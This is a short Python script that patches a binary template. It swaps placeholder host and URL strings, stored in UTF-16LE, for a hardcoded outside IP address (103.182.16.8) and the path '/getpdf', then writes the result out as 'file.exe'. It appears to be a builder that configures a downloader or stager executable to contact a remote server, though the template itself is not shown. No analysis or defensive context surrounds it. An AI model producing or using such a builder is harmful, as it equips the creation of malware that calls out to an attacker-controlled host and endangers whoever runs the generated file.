import re
class ChangeUrl:
    def __init__(self,template_path="template") :
        self.template_path = template_path
        print("Note : Host default is 255.255.255.255")
        print("Note : Port default is 8082")
        print("Note : Url default is /getpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdf")
        with open(self.template_path,"rb") as f:
            self.template = f.read()

    def change_path_url(self,url_path: str="/getpdf"):            
        string ="/getpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdf"
        if len(string) < len(url_path):
            print("Fail: Url path too long")
            return
        string_encode=string.encode('utf-16le')
        if string_encode in self.template:
            print('Found url_path in the file')
        else:
            print('Could not url_path string in the file')
            return
        # encode url path and add byte \x00\x00
        url_path_encode = url_path.encode('utf-16le')
        url_path_encode=url_path_encode+(len(string_encode)-len(url_path_encode))*b"\x00"
        # replace string with url path
        print("Insert url path:",url_path)
        self.template = self.template.replace(string_encode, url_path_encode)
     

    def change_host(self,host: str="103.182.16.8"):            
        string ="255.255.255.255"
        if len(string) < len(host):
            print("Fail: Host too long")
            return
        string_encode=string.encode('utf-16le')
        if string_encode in self.template:
            print('Found host in the file')
        else:
            print('Could not find host in the file')
            return
        # encode url path and add byte \x00\x00
        host_encode = host.encode('utf-16le')
        host_encode=host_encode+(len(string_encode)-len(host_encode))*b"\x00"
        # replace string with url path
        print("Insert host:",host)
        self.template = self.template.replace(string_encode, host_encode)

    def writeToFile(self,file_save="file.exe"):
           # write to file
        print("Write output file:",file_save)
        with open(file_save, "wb") as f:
            f.write(self.template)


changeurl=ChangeUrl()
changeurl.change_host("103.182.16.8")
changeurl.change_path_url("/getpdf")
changeurl.writeToFile("file.exe")